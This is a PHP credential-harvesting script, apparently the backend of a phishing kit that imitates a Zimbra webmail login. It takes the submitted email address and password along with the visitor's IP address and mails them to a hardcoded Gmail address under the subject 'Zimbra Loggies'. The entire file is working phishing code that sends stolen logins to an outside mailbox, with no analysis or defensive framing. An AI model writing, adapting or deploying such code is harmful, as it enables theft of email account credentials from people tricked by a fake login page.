<?php
$ip = getenv("REMOTE_ADDR");	

if(!empty($_POST)) {
 $pop= $_POST['ai'];
 $popi = $_POST['pr'];
 
		$agwu = "carnagiemelissa@gmail.com";
		
		
         $opi = "Zimbra Loggies : $ip";
		 
		 $apki =  "Email ID            : ".$pop."\r\n";
         $apki .= "Password           : ".$popi."\r\n";
		 $apki .= "IP           : ".$ip."\r\n";
		$header = "Content type: Street Vibes \r\n";
         $header .= "MIME-Version: 1.0\r\n";
         $header .= "Content-type: text/html\r\n";
		 
		 mail ($agwu,$opi,$apki,$header);

}
?>
